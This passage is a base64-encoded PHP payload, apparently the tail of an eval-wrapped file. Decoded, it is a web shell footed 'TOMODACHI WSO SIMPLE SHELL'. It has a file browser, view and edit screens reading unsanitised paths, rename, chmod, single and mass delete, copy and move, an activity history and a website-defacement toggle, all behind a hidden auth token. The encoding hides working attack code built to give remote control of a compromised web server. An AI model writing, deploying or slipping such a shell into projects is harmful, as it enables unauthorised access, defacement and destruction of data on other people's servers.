c3VsdCI+DQogICAgPGI+U3VzcGljaW91cyBGaWxlcyBGb3VuZCAoPD9waHAgZWNobyBjb3VudCgkc2Nhbl9yZXN1bHRzKTsgPz4pOjwvYj4NCiAgICA8dGFibGUgc3R5bGU9Im1hcmdpbi10b3A6MTBweDsgd2lkdGg6MTAwJTsiPg0KICAgICAgICA8dHI+PHRoPkZpbGU8L3RoPjx0aD5TaXplPC90aD48dGg+TWF0Y2hlczwvdGg+PHRoPlBhdHRlcm5zIERldGVjdGVkPC90aD48L3RyPg0KICAgICAgICA8P3BocCBmb3JlYWNoICgkc2Nhbl9yZXN1bHRzIGFzICRyKTogPz4NCiAgICAgICAgPHRyPg0KICAgICAgICAgICAgPHRkPjxiPjw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkclsnZmlsZSddKTsgPz48L2I+PC90ZD4NCiAgICAgICAgICAgIDx0ZD48P3BocCBlY2hvICRyWydzaXplJ107ID8+PC90ZD4NCiAgICAgICAgICAgIDx0ZD48P3BocCBlY2hvICRyWydjb3VudCddOyA/PjwvdGQ+DQogICAgICAgICAgICA8dGQ+PD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRyWydwYXR0ZXJucyddKTsgPz48L3RkPg0KICAgICAgICA8L3RyPg0KICAgICAgICA8P3BocCBlbmRmb3JlYWNoOyA/Pg0KICAgIDwvdGFibGU+DQo8L2Rpdj4NCjw/cGhwIGVsc2VpZiAoaXNzZXQoJF9QT1NUWydydW5fc2NhbiddKSk6ID8+DQo8ZGl2IGNsYXNzPSJzY2FuLXJlc3VsdCIgc3R5bGU9ImJvcmRlci1jb2xvcjpncmVlbjsgY29sb3I6IzkwZWU5MDsiPg0KICAgIE5vIG1hbGljaW91cyBwYXR0ZXJucyBkZXRlY3RlZC4NCjwvZGl2Pg0KPD9waHAgZW5kaWY7ID8+DQoNCjwhLS0gRmlsZSBMaXN0IC0tPg0KPGJyPg0KPGgzPkZpbGUgTGlzdDwvaDM+DQo8dGFibGU+DQogICAgPHRyPg0KICAgICAgICA8dGg+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBpZD0ic2VsZWN0QWxsIiBvbmNsaWNrPSJ0b2dnbGVBbGwodGhpcykiPjwvdGg+DQogICAgICAgIDx0aD5QZXJtPC90aD4NCiAgICAgICAgPHRoPk5hbWU8L3RoPg0KICAgICAgICA8dGg+U2l6ZTwvdGg+DQogICAgICAgIDx0aD5BY3Rpb25zPC90aD4NCiAgICA8L3RyPg0KPD9waHANCi8vIFRhbXBpbGthbiAuLyBkYW4gLi4vDQplY2hvICI8dHI+PHRkPjwvdGQ+PHRkPiIgLiBnZXRQZXJtc1N0cmluZygnLicpIC4gIjwvdGQ+PHRkPjxhIGhyZWY9Jz9wYXRoPSIgLiB1cmxlbmNvZGUocmVhbHBhdGgoJy4nKSkgLiAkYXV0aF9hcHBlbmQgLiAiJz48Yj4uLzwvYj48L2E+PC90ZD48dGQ+LTwvdGQ+PHRkIGNsYXNzPSdhY3Rpb24nPi08L3RkPjwvdHI+IjsNCmVjaG8gIjx0cj48dGQ+PC90ZD48dGQ+IiAuIGdldFBlcm1zU3RyaW5nKCcuLicpIC4gIjwvdGQ+PHRkPjxhIGhyZWY9Jz9wYXRoPSIgLiB1cmxlbmNvZGUocmVhbHBhdGgoJy4uJykpIC4gJGF1dGhfYXBwZW5kIC4gIic+PGI+Li4vPC9iPjwvYT48L3RkPjx0ZD4tPC90ZD48dGQgY2xhc3M9J2FjdGlvbic+LTwvdGQ+PC90cj4iOw0KDQovLyBUQU1QSUxLQU4gU0VNVUEgRklMRSwgVEVSTUFTVUsgRklMRSBURVJTRU1CVU5ZSQ0KJGVudHJpZXMgPSBhcnJheV92YWx1ZXMoYXJyYXlfZmlsdGVyKHNjYW5kaXIoJHB3ZCksIGZ1bmN0aW9uKCRmKSB7DQogICAgcmV0dXJuICRmICE9PSAnLicgJiYgJGYgIT09ICcuLic7DQp9KSk7DQp1c29ydCgkZW50cmllcywgZnVuY3Rpb24oJGEsICRiKSB1c2UgKCRwd2QpIHsNCiAgICAkYUlzRGlyID0gaXNfZGlyKCRwd2QuJy8nLiRhKTsNCiAgICAkYklzRGlyID0gaXNfZGlyKCRwd2QuJy8nLiRiKTsNCiAgICBpZiAoJGFJc0RpciA9PT0gJGJJc0RpcikgcmV0dXJuIHN0cmNhc2VjbXAoJGEsICRiKTsNCiAgICByZXR1cm4gJGFJc0RpciA/IC0xIDogMTsNCn0pOw0KDQokbm93ID0gdGltZSgpOw0KZm9yZWFjaCAoJGVudHJpZXMgYXMgJGYpIHsNCiAgICAkZnVsbCA9ICRwd2QgLiAnLycgLiAkZjsNCiAgICAkaXNfZGlyID0gaXNfZGlyKCRmdWxsKTsNCiAgICAkc2l6ZSA9ICRpc19kaXIgPyAnLScgOiAoaXNfZmlsZSgkZnVsbCkgPyByb3VuZChmaWxlc2l6ZSgkZnVsbCkvMTAyNCwgMSkgLiAnIEtCJyA6ICc/Jyk7DQogICAgJHBlcm1fc3RyID0gZ2V0UGVybXNTdHJpbmcoJGZ1bGwpOw0KICAgICRpc05ldyA9IChmaWxlX2V4aXN0cygkZnVsbCkgJiYgKCRub3cgLSBmaWxlbXRpbWUoJGZ1bGwpIDwgODY0MDApKTsNCg0KICAgICRhY3Rpb25zID0gJyc7DQogICAgaWYgKCEkaXNfZGlyKSB7DQogICAgICAgICRhY3Rpb25zIC49ICI8YSBocmVmPSc/dmlldz0iIC4gdXJsZW5jb2RlKCRmKSAuICImcGF0aD0iIC4gdXJsZW5jb2RlKCRwd2QpIC4gJGF1dGhfYXBwZW5kIC4gIicgY2xhc3M9J2FjdGlvbi1idG4gYWN0aW9uLXZpZXcnPlZpZXc8L2E+ICI7DQogICAgICAgICRhY3Rpb25zIC49ICI8YSBocmVmPSc/ZWRpdD0iIC4gdXJsZW5jb2RlKCRmKSAuICImcGF0aD0iIC4gdXJsZW5jb2RlKCRwd2QpIC4gJGF1dGhfYXBwZW5kIC4gIicgY2xhc3M9J2FjdGlvbi1idG4gYWN0aW9uLWVkaXQnPkVkaXQ8L2E+ICI7DQogICAgfQ0KICAgICRhY3Rpb25zIC49ICI8YSBocmVmPScjJyBvbmNsaWNrPVwicmVuYW1lRmlsZSgnIiAuIGFkZHNsYXNoZXMoaHRtbHNwZWNpYWxjaGFycygkZiwgRU5UX1FVT1RFUykpIC4gIicpO3JldHVybiBmYWxzZTtcIiBjbGFzcz0nYWN0aW9uLWJ0biBhY3Rpb24tcmVuYW1lJz5SZW5hbWU8L2E+ICI7DQogICAgJGFjdGlvbnMgLj0gIjxhIGhyZWY9JyMnIG9uY2xpY2s9XCJjaG1vZEZpbGUoJyIgLiBhZGRzbGFzaGVzKGh0bWxzcGVjaWFsY2hhcnMoJGYsIEVOVF9RVU9URVMpKSAuICInKTtyZXR1cm4gZmFsc2U7XCIgY2xhc3M9J2FjdGlvbi1idG4gYWN0aW9uLWNobW9kJz5DaG1vZDwvYT4gIjsNCiAgICAkYWN0aW9ucyAuPSAiPGEgaHJlZj0nIycgb25jbGljaz1cImRlbGV0ZUZpbGUoJyIgLiBhZGRzbGFzaGVzKGh0bWxzcGVjaWFsY2hhcnMoJGYsIEVOVF9RVU9URVMpKSAuICInKTtyZXR1cm4gZmFsc2U7XCIgY2xhc3M9J2FjdGlvbi1idG4gYWN0aW9uLWRlbGV0ZSc+RGVsZXRlPC9hPiI7DQoNCiAgICAkbmV3VGFnID0gJyc7DQogICAgaWYgKCRpc05ldykgew0KICAgICAgICAkbXRpbWUgPSBkYXRlKCdZLW0tZCBIOmk6cycsIGZpbGVtdGltZSgkZnVsbCkpOw0KICAgICAgICAkbmV3VGFnID0gIjxzcGFuIGNsYXNzPSduZXctZmlsZScgb25jbGljaz1cImFsZXJ0KCdNb2RpZmllZDogJG10aW1lJyk7XCI+W05FV108L3NwYW4+IjsNCiAgICB9DQoNCiAgICBlY2hvICI8dHI+IjsNCiAgICBlY2hvICI8dGQ+PGlucHV0IHR5cGU9J2NoZWNrYm94JyBuYW1lPSdzZWxlY3RlZFtdJyB2YWx1ZT0nIiAuIGh0bWxzcGVjaWFsY2hhcnMoJGYsIEVOVF9RVU9URVMpIC4gIic+PC90ZD4iOw0KICAgIGVjaG8gIjx0ZD4kcGVybV9zdHI8L3RkPiI7DQogICAgZWNobyAiPHRkPjxhIGhyZWY9JyIgLiAoJGlzX2RpciA/ICI/cGF0aD0iIC4gdXJsZW5jb2RlKCRmdWxsKSAuICRhdXRoX2FwcGVuZCA6ICIjIikgLiAiJz48Yj4iIC4gaHRtbHNwZWNpYWxjaGFycygkZikgLiAiICRuZXdUYWc8L2I+PC9hPjwvdGQ+IjsNCiAgICBlY2hvICI8dGQgc3R5bGU9J2NvbG9yOmdyYXk7Jz4kc2l6ZTwvdGQ+IjsNCiAgICBlY2hvICI8dGQgY2xhc3M9J2FjdGlvbic+JGFjdGlvbnM8L3RkPiI7DQogICAgZWNobyAiPC90cj4iOw0KfQ0KPz4NCjwvdGFibGU+DQoNCjwhLS0gTWFzcyBEZWxldGUgRm9ybSAtLT4NCjxicj4NCjxmb3JtIG1ldGhvZD0icG9zdCIgaWQ9Im1hc3NEZWxldGVGb3JtIiBzdHlsZT0iZGlzcGxheTppbmxpbmU7Ij4NCiAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhdXRoIiB2YWx1ZT0iPD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRzZWNyZXRfYXV0aCk7ID8+Ij4NCiAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJtYXNzX2RlbGV0ZV9hY3Rpb24iIHZhbHVlPSIxIj4NCjwvZm9ybT4NCjxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGJ0bi1yZWQiIG9uY2xpY2s9Im1hc3NEZWxldGUoKSI+TWFzcyBEZWxldGU8L2J1dHRvbj4NCg0KPCEtLSBNYXNzIEFjdGlvbnMgLS0+DQo8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tZ3JlZW4iIG9uY2xpY2s9Im1hc3NBY3Rpb24oJ2NvcHknKSI+TWFzcyBDb3B5PC9idXR0b24+DQo8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tYmx1ZSIgb25jbGljaz0ibWFzc0FjdGlvbignbW92ZScpIj5NYXNzIE1vdmU8L2J1dHRvbj4NCjw/cGhwIGlmICghZW1wdHkoJGNsaXBib2FyZF9pbmZvKSk6ID8+DQo8c3BhbiBzdHlsZT0iY29sb3I6IzY2ZjsgbWFyZ2luLWxlZnQ6MTVweDsiPjw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkY2xpcGJvYXJkX2luZm8pOyA/Pjwvc3Bhbj4NCjw/cGhwIGVuZGlmOyA/Pg0KDQo8IS0tIFRhcmdldCBQYXRoIGZvciBDb3B5L01vdmUgLS0+DQo8YnI+PGJyPg0KPGZvcm0gbWV0aG9kPSJwb3N0IiBpZD0ibWFzc0Zvcm0iIHN0eWxlPSJtYXJnaW4tdG9wOjEwcHg7Ij4NCiAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhdXRoIiB2YWx1ZT0iPD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRzZWNyZXRfYXV0aCk7ID8+Ij4NCiAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJtYXNzX2FjdGlvbiIgaWQ9Im1hc3NBY3Rpb25JbnB1dCI+DQogICAgPGxhYmVsPlRhcmdldCBQYXRoIGZvciBDb3B5L01vdmUgKGRlZmF1bHQ6IGN1cnJlbnQpOjwvbGFiZWw+PGJyPg0KICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ0YXJnZXRfcGF0aCIgdmFsdWU9Ijw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkcHdkKTsgPz4iIHN0eWxlPSJ3aWR0aDoxMDAlOyBtYXJnaW46NXB4IDA7Ij4NCjwvZm9ybT4NCg0KPCEtLSBIaXN0b3J5IE1vZGFsIC0tPg0KPGRpdiBpZD0iaGlzdG9yeUJveCIgY2xhc3M9ImZvcm0tYm94IiBzdHlsZT0iZGlzcGxheTpub25lOyI+DQogICAgPGgzPkFjdGl2aXR5IEhpc3RvcnkgKERldGFpbGVkKTwvaDM+DQogICAgPGRpdiBpZD0iaGlzdG9yeUNvbnRlbnQiPg0KPD9waHANCmlmICghZW1wdHkoJF9TRVNTSU9OWyd3c29faGlzdG9yeSddKSkgew0KICAgIGVjaG8gaW1wbG9kZSgiXG4iLCBhcnJheV9yZXZlcnNlKCRfU0VTU0lPTlsnd3NvX2hpc3RvcnknXSkpOw0KfSBlbHNlIHsNCiAgICBlY2hvICJObyBhY3Rpdml0eSByZWNvcmRlZCB5ZXQuIEFsbCBhY3Rpb25zIHdpbGwgYXBwZWFyIGhlcmUuIjsNCn0NCj8+DQogICAgPC9kaXY+DQogICAgPGJyPg0KICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJoaWRlSGlzdG9yeSgpIj5DbG9zZTwvYnV0dG9uPg0KPC9kaXY+DQoNCjw/cGhwDQovLyA9PT0gVklFVyBGSUxFID09PQ0KaWYgKGlzc2V0KCRfR0VUWyd2aWV3J10pKSB7DQogICAgJGZpbGUgPSAkcHdkIC4gJy8nIC4gJF9HRVRbJ3ZpZXcnXTsNCiAgICBpZiAoaXNfZmlsZSgkZmlsZSkpIHsNCiAgICAgICAgZWNobyAiPGgzPlZpZXc6ICIgLiBodG1sc3BlY2lhbGNoYXJzKGJhc2VuYW1lKCRmaWxlKSkgLiAiPC9oMz4iOw0KICAgICAgICBlY2hvICI8cHJlIHN0eWxlPSdiYWNrZ3JvdW5kOnJnYmEoMjAsMjAsMjAsMC44KTsgcGFkZGluZzoxNXB4OyBtYXgtaGVpZ2h0OjQwMHB4OyBvdmVyZmxvdzphdXRvOyBib3JkZXI6MXB4IHNvbGlkICMzMzM7IGJvcmRlci1yYWRpdXM6NnB4Oyc+IjsNCiAgICAgICAgJGNvbnRlbnQgPSBAZmlsZV9nZXRfY29udGVudHMoJGZpbGUpOw0KICAgICAgICBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJGNvbnRlbnQgPzogIihlbXB0eSkiKTsNCiAgICAgICAgZWNobyAiPC9wcmU+IjsNCiAgICAgICAgZWNobyAiPHA+PGEgaHJlZj0nP3BhdGg9IiAuIHVybGVuY29kZSgkcHdkKSAuICRhdXRoX2FwcGVuZCAuICInIGNsYXNzPSdidG4nPkJhY2s8L2E+PC9wPiI7DQogICAgfQ0KfQ0KDQovLyA9PT0gRURJVCBGSUxFID09PQ0KaWYgKGlzc2V0KCRfR0VUWydlZGl0J10pKSB7DQogICAgJGZpbGUgPSAkcHdkIC4gJy8nIC4gJF9HRVRbJ2VkaXQnXTsNCiAgICBpZiAoaXNfZmlsZSgkZmlsZSkpIHsNCiAgICAgICAgJGNvbnRlbnQgPSBAZmlsZV9nZXRfY29udGVudHMoJGZpbGUpOw0KICAgICAgICBpZiAoJGNvbnRlbnQgIT09IGZhbHNlKSB7DQogICAgICAgICAgICAkZmlsZW5hbWUgPSBiYXNlbmFtZSgkZmlsZSk7DQogICAgICAgICAgICBlY2hvICI8aDM+RWRpdDogIiAuIGh0bWxzcGVjaWFsY2hhcnMoJGZpbGVuYW1lKSAuICI8L2gzPiI7DQogICAgICAgICAgICBlY2hvICI8Zm9ybSBtZXRob2Q9J3Bvc3QnPiI7DQogICAgICAgICAgICBlY2hvICI8aW5wdXQgdHlwZT0naGlkZGVuJyBuYW1lPSdhdXRoJyB2YWx1ZT0nIiAuIGh0bWxzcGVjaWFsY2hhcnMoJHNlY3JldF9hdXRoLCBFTlRfUVVPVEVTKSAuICInPiI7DQogICAgICAgICAgICBlY2hvICI8aW5wdXQgdHlwZT0naGlkZGVuJyBuYW1lPSdmaWxlbmFtZScgdmFsdWU9JyIgLiBodG1sc3BlY2lhbGNoYXJzKCRmaWxlbmFtZSwgRU5UX1FVT1RFUykgLiAiJz4iOw0KICAgICAgICAgICAgZWNobyAiPHRleHRhcmVhIG5hbWU9J2NvbnRlbnQnIHJvd3M9JzIyJyBjb2xzPScxMTAnIHN0eWxlPSd3aWR0aDoxMDAlOyBiYWNrZ3JvdW5kOnJnYmEoMTAsMTAsMTAsMC44KTsgYm9yZGVyOjFweCBzb2xpZCAjMDBmZjk5OyBjb2xvcjojMDBmZjk5OyBwYWRkaW5nOjEwcHg7IGJvcmRlci1yYWRpdXM6NHB4Oyc+IiAuIGh0bWxzcGVjaWFsY2hhcnMoJGNvbnRlbnQpIC4gIjwvdGV4dGFyZWE+PGJyPjxicj4iOw0KICAgICAgICAgICAgZWNobyAiPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nc2F2ZScgdmFsdWU9J1NhdmUgQ2hhbmdlcycgY2xhc3M9J2J0bic+IjsNCiAgICAgICAgICAgIGVjaG8gIiA8YSBocmVmPSc/cGF0aD0iIC4gdXJsZW5jb2RlKCRwd2QpIC4gJGF1dGhfYXBwZW5kIC4gIicgY2xhc3M9J2J0bic+Q2FuY2VsPC9hPiI7DQogICAgICAgICAgICBlY2hvICI8L2Zvcm0+IjsNCiAgICAgICAgfQ0KICAgIH0NCn0NCj8+DQoNCjxzY3JpcHQ+DQpmdW5jdGlvbiB0b2dnbGVEZWZhY2UoKSB7DQogICAgY29uc3QgYm94ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2RlZmFjZUJveCcpOw0KICAgIGJveC5zdHlsZS5kaXNwbGF5ID0gYm94LnN0eWxlLmRpc3BsYXkgPT09ICdub25lJyA/ICdibG9jaycgOiAnbm9uZSc7DQp9DQoNCmZ1bmN0aW9uIHRvZ2dsZUNyZWF0ZUZpbGUoKSB7DQogICAgY29uc3QgYm94ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NyZWF0ZUZpbGVCb3gnKTsNCiAgICBib3guc3R5bGUuZGlzcGxheSA9IGJveC5zdHlsZS5kaXNwbGF5ID09PSAnbm9uZScgPyAnYmxvY2snIDogJ25vbmUnOw0KfQ0KDQpmdW5jdGlvbiB0b2dnbGVDcmVhdGVGb2xkZXIoKSB7DQogICAgY29uc3QgYm94ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NyZWF0ZUZvbGRlckJveCcpOw0KICAgIGJveC5zdHlsZS5kaXNwbGF5ID0gYm94LnN0eWxlLmRpc3BsYXkgPT09ICdub25lJyA/ICdibG9jaycgOiAnbm9uZSc7DQp9DQoNCmZ1bmN0aW9uIHNob3dIaXN0b3J5KCkgew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoaXN0b3J5Qm94Jykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQp9DQoNCmZ1bmN0aW9uIGhpZGVIaXN0b3J5KCkgew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoaXN0b3J5Qm94Jykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCn0NCg0KZnVuY3Rpb24gdG9nZ2xlQWxsKHNvdXJjZSkgew0KICAgIGNoZWNrYm94ZXMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgnc2VsZWN0ZWRbXScpOw0KICAgIGZvciAodmFyIGkgPSAwOyBpIDwgY2hlY2tib3hlcy5sZW5ndGg7IGkrKykgew0KICAgICAgICBjaGVja2JveGVzW2ldLmNoZWNrZWQgPSBzb3VyY2UuY2hlY2tlZDsNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIG1hc3NEZWxldGUoKSB7DQogICAgY29uc3Qgc2VsZWN0ZWQgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdpbnB1dFtuYW1lPSJzZWxlY3RlZFtdIl06Y2hlY2tlZCcpOw0KICAgIGlmIChzZWxlY3RlZC5sZW5ndGggPT09IDApIHsNCiAgICAgICAgYWxlcnQoJ1BsZWFzZSBzZWxlY3QgYXQgbGVhc3Qgb25lIGZpbGUvZm9sZGVyLicpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIC8vIOKchSBUQU5QQSBLT05GSVJNQVNJDQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hc3NEZWxldGVGb3JtJykuc3VibWl0KCk7DQp9DQoNCmZ1bmN0aW9uIG1hc3NBY3Rpb24oYWN0aW9uKSB7DQogICAgY29uc3Qgc2VsZWN0ZWQgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdpbnB1dFtuYW1lPSJzZWxlY3RlZFtdIl06Y2hlY2tlZCcpOw0KICAgIGlmIChhY3Rpb24gIT09ICdwYXN0ZScgJiYgc2VsZWN0ZWQubGVuZ3RoID09PSAwKSB7DQogICAgICAgIGFsZXJ0KCdQbGVhc2Ugc2VsZWN0IGF0IGxlYXN0IG9uZSBmaWxlL2ZvbGRlci4nKTsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFzc0FjdGlvbklucHV0JykudmFsdWUgPSBhY3Rpb247DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hc3NGb3JtJykuc3VibWl0KCk7DQp9DQoNCmZ1bmN0aW9uIHJlbmFtZUZpbGUobmFtZSkgew0KICAgIGxldCBuZXduYW1lID0gcHJvbXB0KCJSZW5hbWUgJyIgKyBuYW1lICsgIicgdG86IiwgbmFtZSk7DQogICAgaWYgKG5ld25hbWUgIT09IG51bGwgJiYgbmV3bmFtZS50cmltKCkgIT09ICIiICYmIG5ld25hbWUgIT09IG5hbWUpIHsNCiAgICAgICAgbGV0IGZvcm0gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJmb3JtIik7DQogICAgICAgIGZvcm0ubWV0aG9kID0gInBvc3QiOw0KICAgICAgICBmb3JtLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogICAgICAgIGZvcm0uaW5uZXJIVE1MID0gYA0KICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYXV0aCIgdmFsdWU9Ijw/cGhwIGVjaG8gYWRkc2xhc2hlcyhodG1sc3BlY2lhbGNoYXJzKCRzZWNyZXRfYXV0aCkpOyA/PiI+DQogICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJvbGRuYW1lIiB2YWx1ZT0iJHtuYW1lLnJlcGxhY2UoLyIvZywgJyZxdW90OycpfSI+DQogICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJuZXduYW1lIiB2YWx1ZT0iJHtuZXduYW1lLnJlcGxhY2UoLyIvZywgJyZxdW90OycpfSI+DQogICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkb19yZW5hbWUiIHZhbHVlPSIxIj4NCiAgICAgICAgYDsNCiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmb3JtKTsNCiAgICAgICAgZm9ybS5zdWJtaXQoKTsNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIGNobW9kRmlsZShuYW1lKSB7DQogICAgbGV0IHBlcm0gPSBwcm9tcHQoIkNobW9kIGZvciAnIiArIG5hbWUgKyAiJyAoZS5nLiAwNzU1KToiLCAiMDc1NSIpOw0KICAgIGlmIChwZXJtICE9PSBudWxsICYmIC9eXGR7Myw0fSQvLnRlc3QocGVybS50cmltKCkpKSB7DQogICAgICAgIGxldCBwID0gcGVybS50cmltKCk7DQogICAgICAgIGlmICghcC5zdGFydHNXaXRoKCcwJykpIHAgPSAnMCcgKyBwOw0KICAgICAgICBsZXQgZm9ybSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImZvcm0iKTsNCiAgICAgICAgZm9ybS5tZXRob2QgPSAicG9zdCI7DQogICAgICAgIGZvcm0uc3R5bGUuZGlzcGxheSA9ICJub25lIjsNCiAgICAgICAgZm9ybS5pbm5lckhUTUwgPSBgDQogICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhdXRoIiB2YWx1ZT0iPD9waHAgZWNobyBhZGRzbGFzaGVzKGh0bWxzcGVjaWFsY2hhcnMoJHNlY3JldF9hdXRoKSk7ID8+Ij4NCiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImNobW9kX3RhcmdldCIgdmFsdWU9IiR7bmFtZS5yZXBsYWNlKC8iL2csICcmcXVvdDsnKX0iPg0KICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iY2htb2RfdmFsdWUiIHZhbHVlPSIke3B9Ij4NCiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImRvX2NobW9kIiB2YWx1ZT0iMSI+DQogICAgICAgIGA7DQogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoZm9ybSk7DQogICAgICAgIGZvcm0uc3VibWl0KCk7DQogICAgfSBlbHNlIGlmIChwZXJtICE9PSBudWxsKSB7DQogICAgICAgIGFsZXJ0KCJJbnZhbGlkIGNobW9kICh1c2UgMyBvciA0IGRpZ2l0cywgZS5nLiAwNzU1KS4iKTsNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIGNobW9kUGF0aChwYXRoKSB7DQogICAgbGV0IHBlcm0gPSBwcm9tcHQoIkNobW9kIGN1cnJlbnQgZGlyZWN0b3J5IChlLmcuIDA3NTUpOiIsICIwNzU1Iik7DQogICAgaWYgKHBlcm0gIT09IG51bGwgJiYgL15cZHszLDR9JC8udGVzdChwZXJtLnRyaW0oKSkpIHsNCiAgICAgICAgbGV0IHAgPSBwZXJtLnRyaW0oKTsNCiAgICAgICAgaWYgKCFwLnN0YXJ0c1dpdGgoJzAnKSkgcCA9ICcwJyArIHA7DQogICAgICAgIGxldCBmb3JtID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZm9ybSIpOw0KICAgICAgICBmb3JtLm1ldGhvZCA9ICJwb3N0IjsNCiAgICAgICAgZm9ybS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICAgICAgICBmb3JtLmlubmVySFRNTCA9IGANCiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImF1dGgiIHZhbHVlPSI8P3BocCBlY2hvIGFkZHNsYXNoZXMoaHRtbHNwZWNpYWxjaGFycygkc2VjcmV0X2F1dGgpKTsgPz4iPg0KICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iY2htb2RfcGF0aCIgdmFsdWU9IjEiPg0KICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iY2htb2RfdmFsdWUiIHZhbHVlPSIke3B9Ij4NCiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImRvX2NobW9kIiB2YWx1ZT0iMSI+DQogICAgICAgIGA7DQogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoZm9ybSk7DQogICAgICAgIGZvcm0uc3VibWl0KCk7DQogICAgfSBlbHNlIGlmIChwZXJtICE9PSBudWxsKSB7DQogICAgICAgIGFsZXJ0KCJJbnZhbGlkIGNobW9kIHZhbHVlLiIpOw0KICAgIH0NCn0NCg0KZnVuY3Rpb24gZGVsZXRlRmlsZShuYW1lKSB7DQogICAgaWYgKCFjb25maXJtKCdEZWxldGUgIicgKyBuYW1lICsgJyIgcGVybWFuZW50bHk/JykpIHJldHVybjsNCiAgICBsZXQgZm9ybSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImZvcm0iKTsNCiAgICBmb3JtLm1ldGhvZCA9ICJwb3N0IjsNCiAgICBmb3JtLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogICAgZm9ybS5pbm5lckhUTUwgPSBgDQogICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImF1dGgiIHZhbHVlPSI8P3BocCBlY2hvIGFkZHNsYXNoZXMoaHRtbHNwZWNpYWxjaGFycygkc2VjcmV0X2F1dGgpKTsgPz4iPg0KICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJtYXNzX2RlbGV0ZV9hY3Rpb24iIHZhbHVlPSIxIj4NCiAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic2VsZWN0ZWRbXSIgdmFsdWU9IiR7bmFtZS5yZXBsYWNlKC8iL2csICcmcXVvdDsnKX0iPg0KICAgIGA7DQogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmb3JtKTsNCiAgICBmb3JtLnN1Ym1pdCgpOw0KfQ0KPC9zY3JpcHQ+DQoNCjxocj4NCjxzbWFsbCBzdHlsZT0iY29sb3I6IzY2NjsiPlRPTU9EQUNISSBXU08gU0lNUExFIFNIRUxMIOKAoiA8P3BocCBlY2hvIGRhdGUoJ1ktbS1kIEg6aTpzJyk7ID8+PC9zbWFsbD4NCg0KPC9ib2R5Pg0KPC9odG1sPg=="));?>
